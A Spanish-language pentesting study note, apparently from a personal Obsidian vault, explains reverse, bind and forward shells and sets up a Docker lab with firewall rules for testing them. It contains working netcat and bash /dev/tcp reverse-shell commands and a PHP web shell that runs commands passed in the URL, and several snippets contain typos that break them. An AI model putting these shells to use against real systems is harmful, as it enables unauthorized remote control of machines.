- Tags: #reverse_shell #bind_shells #forward_shells #shells #recursos

- REVERSE SHELL
- Se establece cuando forzamos a la maquina objetivo a establecer una conexión hacia nuestra maquina obteniendo una consola interactiva
- - **Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.
![[Pasted image 20260113110609.png]]

```bash
M_Target
ncat -e /bin/bash ip port

M_Atacante
nc -nlvp port

#Para tener una bash mas visual
script /dev/null -c bash
```

- BIND SHELL
- En la maquina objetivo nos abrimos un puerto en escucha y mediante netcat establecemos una conexión y esta conexión nos da una consola interactiva  
- **Bind Shell**: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.
![[Pasted image 20260113111118.png]]

```bash
M_Target
ncat -nlvp 443 -e /bin/bash 

M_Atacante
nc ip port

#Para tener una bash mas visual
script /dev/null -c bash
```

- FORWARD SHELL
- Plantea jugar con named pipe empleando el comando **mkfifo** para mediante archivos temporales atraves de los cuales de un input que se ponga en uno de los archivos existentes ver el output en otro archivo logrando la comunicacion en tre procesos
-  **Forward Shell**: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.
 
Script de Svitar en github ttyoverhttp https://github.com/s4vitar/ttyoverhttp
Para ponerlas a prueba craremos unas reglas de firewall en el contenedor.
```bash
#Corremos el contenedor con estos parametros
docker run -dit -p 80:80 --cap-add=NET_ADMIN -name myContenedor myImage

docker exec -it myContainer bash

apt install iptables

iptables --flush

iptables -A INPUT -p TCP --dport 80 -j ACCEPT
iptables -A INPUT -p TCP --dport 0:65535 -m conntrack --ctstate New -j DROP

iptables -A OUTPUT -p TCP -m tcp -o eth0 --sport 80 -j ACCEPT
iptables -A OUTPUT -o eth0 New -j DROP
#Modificar en apche config /etc/php/php5.x.apache2/php.ini
short_open_tag = on


#EN /var/www/htmp creamos un script.php
<?
	echo "<pre>". shell_excec($_GET['cmd']). "</pre>";
?>

```

Dockerfile Para brobar las Shells

```SQL
FROM ubunt:lates

ENV DEBIAN_FRONTED noninteractive

RUN apt update && apt install -y apache2 php libapache2-mod-php

EXPOSE 80

ENTRYPOINT service apache2 start && /bin/bash


#Generar la imagen
docker build -t myImagen 

docker run -dit -p 80:80 -name myContenedor myImage
```

Conectar al contenedor
```
docker exec -it myContainer bash

#Intalamos ncat
apt install ncat
```

Vale destacar que las conexiones no necesariamente se deben establecer con ncat se pueden hacer con otras utilidades eje.
Recursos
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```
bash -i >& /dev/tcp/ip/port 0>&1
```
